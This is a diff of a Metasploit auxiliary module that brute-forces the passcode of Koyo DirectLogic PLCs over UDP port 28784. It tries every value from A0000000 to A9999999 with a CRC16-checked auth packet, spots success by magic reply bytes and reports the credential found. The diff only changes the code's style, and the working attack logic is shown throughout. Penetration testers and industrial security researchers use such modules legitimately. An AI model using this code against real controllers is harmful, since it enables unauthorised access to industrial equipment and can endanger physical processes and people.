@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/core'
 # TODO: Make into a real AuthBrute module, although the password pattern is fixed
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'           => 'Koyo DirectLogic PLC Password Brute Force Utility',
-      'Description'    => %q{
+      'Description'    => %q(
           This module attempts to authenticate to a locked Koyo DirectLogic PLC.
         The PLC uses a restrictive passcode, which can be A0000000 through A9999999.
         The "A" prefix can also be changed by the administrator to any other character,
@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Auxiliary
 
         This module is based on the original 'koyobrute.rb' Basecamp module from
         DigitalBond.
-      },
+      ),
       'Author'         =>
         [
           'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
@@ -44,7 +44,8 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('RECV_TIMEOUT', [false, "Time (in seconds) to wait between packets", 3]),
         OptString.new('PREFIX', [true, 'The prefix to use for the password (default: A)', "A"]),
         Opt::RPORT(28784)
-      ], self.class)
+      ], self.class
+    )
   end
 
   @@CCITT_16 = [
@@ -82,13 +83,12 @@ class MetasploitModule < Msf::Auxiliary
     0x6E17, 0x7E36, 0x4E55, 0x5E74, 0x2E93, 0x3EB2, 0x0ED1, 0x1EF0
   ]
 
-  def run_host(ip)
-
+  def run_host(_ip)
     # Create a socket in order to receive responses from a non-default IP
     @udp_sock = Rex::Socket::Udp.create(
       'PeerHost'  => rhost,
       'PeerPort'  => rport.to_i,
-      'Context'   => {'Msf' => framework, 'MsfExploit' => self}
+      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
     )
     add_socket(@udp_sock)
 
@@ -106,12 +106,12 @@ class MetasploitModule < Msf::Auxiliary
     # or something fancier
 
     (0..9999999).each do |i|
-      passcode = datastore['PREFIX'] + i.to_s.rjust(7,'0')
+      passcode = datastore['PREFIX'] + i.to_s.rjust(7, '0')
       vprint_status("#{rhost}:#{rport} - KOYO - Trying #{passcode}")
       bytes = passcode.scan(/../).map { |x| x.to_i(16) }
       passstr = bytes.pack("C*")
       res = try_auth(passstr)
-      next if not res
+      next unless res
 
       print_good "#{rhost}:#{rport} - KOYO - Found passcode: #{passcode}"
       report_cred(
@@ -124,7 +124,6 @@ class MetasploitModule < Msf::Auxiliary
       )
       break
     end
-
   end
 
   def report_cred(opts)
@@ -153,8 +152,8 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def crc16(buf, crc=0)
-    buf.each_byte{|x| crc = ((crc << 8) ^ @@CCITT_16[( crc >> 8) ^ x]) & 0xffff }
+  def crc16(buf, crc = 0)
+    buf.each_byte { |x| crc = ((crc << 8) ^ @@CCITT_16[(crc >> 8) ^ x]) & 0xffff }
     [crc].pack("v")
   end
 
@@ -170,16 +169,14 @@ class MetasploitModule < Msf::Auxiliary
     #
     # Another way to speed things up is to use fancy threading, but that's for another
     # day.
-    while (r = @udp_sock.recvfrom(65535, 0.1) and recvpacks < 2)
+    while (r = @udp_sock.recvfrom(65535, 0.1)) && recvpacks < 2
       res = r[0]
       if res.length == 269 # auth reply packet
-        if res[17,1] == "\x00" and res[19,1] == "\xD2" # Magic bytes
-          return true
-        end
+        return true if (res[17, 1] == "\x00") && (res[19, 1] == "\xD2") # Magic bytes
       end
       recvpacks += 1
     end
-    return false
+    false
   end
 
   def try_auth(passstr)
@@ -196,7 +193,7 @@ class MetasploitModule < Msf::Auxiliary
 
     status = unlock_check
 
-    return status
+    status
   end
 
   def recv_timeout
